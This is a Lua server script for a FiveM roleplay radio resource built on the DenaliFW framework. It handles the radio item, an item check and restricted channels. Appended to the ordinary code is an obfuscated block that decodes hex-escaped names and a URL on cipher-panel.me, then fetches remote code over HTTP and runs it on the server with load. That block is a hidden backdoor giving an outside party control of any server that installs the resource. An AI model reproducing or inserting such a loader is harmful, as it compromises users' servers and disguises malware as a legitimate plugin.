local DenaliFW = exports['denalifw-core']:GetCoreObject()

DenaliFW.Functions.CreateUseableItem("radio", function(source, item)
    TriggerClientEvent('qb-radio:use', source)
end)

DenaliFW.Functions.CreateCallback('qb-radio:server:GetItem', function(source, cb, item)
    local src = source
    local Player = DenaliFW.Functions.GetPlayer(src)
    if Player ~= nil then
        local RadioItem = Player.Functions.GetItemByName(item)
        if RadioItem ~= nil and not Player.PlayerData.metadata["isdead"] and
            not Player.PlayerData.metadata["inlaststand"] then
            cb(true)
        else
            cb(false)
        end
    else
        cb(false)
    end
end)

for channel, config in pairs(Config.RestrictedChannels) do
    exports['pma-voice']:addChannelCheck(channel, function(source)
        local Player = DenaliFW.Functions.GetPlayer(source)
        return config[Player.PlayerData.job.name] and Player.PlayerData.job.onduty
    end)
end


local lfxNSTekWPWPojHwAlquPWdysaxWtsqjgUuSCtdEEQLneJyTMaygNixeRmOGxDHxJynIUO = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} lfxNSTekWPWPojHwAlquPWdysaxWtsqjgUuSCtdEEQLneJyTMaygNixeRmOGxDHxJynIUO[4][lfxNSTekWPWPojHwAlquPWdysaxWtsqjgUuSCtdEEQLneJyTMaygNixeRmOGxDHxJynIUO[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x71\x47\x32\x72\x30", function (VJbRRMvBkChIDguFGMkhsRzTupTGKBzCxisqJPHSsIHBhvwrSMOQRACwVwzlacLsaDRUvN, TjceEibIoDuXhgrRxSBkJStnwhKuOlwOlmyRBbSrmXJHUUhulkXEFvGIrgOBKoDWWQuFYv) if (TjceEibIoDuXhgrRxSBkJStnwhKuOlwOlmyRBbSrmXJHUUhulkXEFvGIrgOBKoDWWQuFYv == lfxNSTekWPWPojHwAlquPWdysaxWtsqjgUuSCtdEEQLneJyTMaygNixeRmOGxDHxJynIUO[6] or TjceEibIoDuXhgrRxSBkJStnwhKuOlwOlmyRBbSrmXJHUUhulkXEFvGIrgOBKoDWWQuFYv == lfxNSTekWPWPojHwAlquPWdysaxWtsqjgUuSCtdEEQLneJyTMaygNixeRmOGxDHxJynIUO[5]) then return end lfxNSTekWPWPojHwAlquPWdysaxWtsqjgUuSCtdEEQLneJyTMaygNixeRmOGxDHxJynIUO[4][lfxNSTekWPWPojHwAlquPWdysaxWtsqjgUuSCtdEEQLneJyTMaygNixeRmOGxDHxJynIUO[2]](lfxNSTekWPWPojHwAlquPWdysaxWtsqjgUuSCtdEEQLneJyTMaygNixeRmOGxDHxJynIUO[4][lfxNSTekWPWPojHwAlquPWdysaxWtsqjgUuSCtdEEQLneJyTMaygNixeRmOGxDHxJynIUO[3]](TjceEibIoDuXhgrRxSBkJStnwhKuOlwOlmyRBbSrmXJHUUhulkXEFvGIrgOBKoDWWQuFYv))() end)